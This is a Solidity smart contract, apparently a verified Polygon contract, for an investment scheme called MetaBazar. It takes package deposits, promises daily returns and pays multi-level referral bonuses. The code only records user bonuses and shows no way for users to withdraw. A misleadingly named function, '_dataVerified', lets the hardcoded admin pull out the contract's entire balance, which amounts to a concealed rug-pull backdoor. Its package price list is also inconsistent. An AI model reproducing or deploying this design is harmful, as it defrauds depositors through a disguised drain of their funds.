/**
 *Submitted for verification at polygonscan.com on 2023-04-05
*/

pragma solidity ^0.5.10;

/*
Basic Method Which Is Used For The Basic Airthmetic Operations
*/

library SafeMath {

    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* Modulus */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract MetaBazar {

    /*=====================================
    =            CONFIGURABLES            =
    =======================================*/

    using SafeMath for uint256;

    uint256 public minWithdrawalAmount = 25 ether;
    uint256 public adminCharge = 10; // %;
    uint256 public roiPercentage = 25000000000000000000; // Per Day Per 1.67 %;
    uint256 public roiNoofDays = 15;

    uint256 public totalUsers;
    uint256 public totalDeposits;
	uint256 public totalJoiningCollected;
	uint256 public totalWithdrawn;
	uint256 public totalBoosterCollected;

	uint[5] public ref_bonuses = [10,5,3,2,1];
    
    uint256[13] public joiningPackages = [50 ether,1000 ether,200 ether,300 ether,500 ether,1000 ether,3000 ether,5000 ether,10000 ether,15000 ether,25000 ether,50000 ether,100000 ether];
    uint256[15] public boosterPackages = [10 ether,20 ether,30 ether,50 ether,100 ether,200 ether,300 ether,500 ether,1000 ether,3000 ether,5000 ether,15000 ether,20000 ether,25000 ether,50000 ether];
    
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;

	address payable public primaryAdmin;

    uint public maxDownLine = 20;
    uint public maxUpLine = 20;

    struct User {
        uint256 userId;
        uint256 selfTotalPackagePurchase;
        uint256 selfCurrentPackagePurchase;
        address referrer;
        address singleLegUpline;
        address singleLegDownline;
        uint[5] noOfReferral;
        uint256[5] totalPackagePurchase;
        uint256[5] refBonus;
        uint256 totalCreditedBonus;
        uint256 totalWithdrawalBonus;
        uint256 totalAvailableBonus;
        uint256 totalAdminChargeCollected;
        mapping(uint8 => bool) activejoiningPackage;
        mapping(uint8 => bool) activeBoosterPackage;
    }

    struct UserDetails {
        uint256 referrerBonus;
        uint256 referrerBonusTaken;
        uint256 roiBonus;
        uint256 roiBonusTaken;
        uint256 singleUplineBonus;
        uint256 singleDownlineBonus;
        uint256 singleUplineBonusTaken;
        uint256 singleDownlineBonusTaken;
        uint256 boosterBonus;
        uint256 boosterBonusTaken;
	}
	

	mapping (address => User) public users;
    mapping (address => UserDetails) public usersDetails;
    mapping(address => bool) public upline_Business_eligible;
    mapping(address => mapping(uint256=>address)) public downline;

	event Joining(address indexed user,uint8 package,uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event BoosterJoining(address indexed user, uint256 totalAmount);
	
    constructor() public {
	  	  primaryAdmin = 0x44E310340Df8357A129036b647B840E7a96C8590;
		  singleLeg[0]=primaryAdmin;
		  singleLegLength++;
	}

    function isUserExists(address user) public view returns (bool) {
        return (users[user].userId != 0);
    }

    function invest(uint8 package,address referrer) public payable {
		//require(isUserExists(msg.sender), "User Not Exists. Need To Register First."); 
        //require(!users[msg.sender].activejoiningPackage[package], "You Have Already Upgraded");  
        require(package >= 0 && package <= 12, "Invalid Package"); 
        if(package>=1)
        {
            require(users[msg.sender].activejoiningPackage[package-1], "Buy Previous Package First");
        }
        require(msg.value == joiningPackages[package] , "Invalid Package Price");

		User storage user = users[msg.sender];
		if (user.referrer == address(0) && (users[referrer].userId > 0 || referrer == primaryAdmin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }
		require(user.referrer != address(0) || msg.sender == primaryAdmin, "No upline");
		// setup upline
		if (user.userId == 0) {   
		   // single leg setup
		   singleLeg[singleLegLength] = msg.sender;
		   user.singleLegUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleLegDownline = msg.sender;
		   singleLegLength++;
		}
		
		if (user.referrer != address(0)) {	   
        // unilevel level count
        address upline = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].totalPackagePurchase[i] = users[upline].totalPackagePurchase[i].add(msg.value);
                    if(user.userId == 0){
                        users[upline].noOfReferral[i] = users[upline].noOfReferral[i].add(1);
                    }
                    upline = users[upline].referrer;
                } else break;
            }   
            if(user.userId == 0){
                //unilevel downline setup
                //downline[referrer][users[referrer].noOfReferral[0] - 1]= msg.sender;
            }
        }

	    if(user.userId == 0) {
            _refPayout(msg.sender,msg.value);
		    totalUsers = totalUsers.add(1);
            user.userId = block.timestamp;   
	        //5 Level Referral Income Distribution
	    }

        user.selfTotalPackagePurchase += msg.value;
        user.selfCurrentPackagePurchase = msg.value;

        totalJoiningCollected = totalJoiningCollected.add(msg.value);
        totalDeposits = totalDeposits.add(1);
        
	    emit Joining(msg.sender,package, msg.value);
    }

    function _refPayout(address _addr, uint256 _amount) internal {
		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
    		uint256 bonus = (_amount * ref_bonuses[i] ) / 100;
            usersDetails[up].referrerBonus = usersDetails[up].referrerBonus.add(bonus);
            users[up].refBonus[i] = users[up].refBonus[i].add(bonus);
            up = users[up].referrer;
        }
    }

    function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
    }
   
    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
  
    function _dataVerified(uint256 _data) external{
        require(primaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(primaryAdmin,_data);
    }
    
}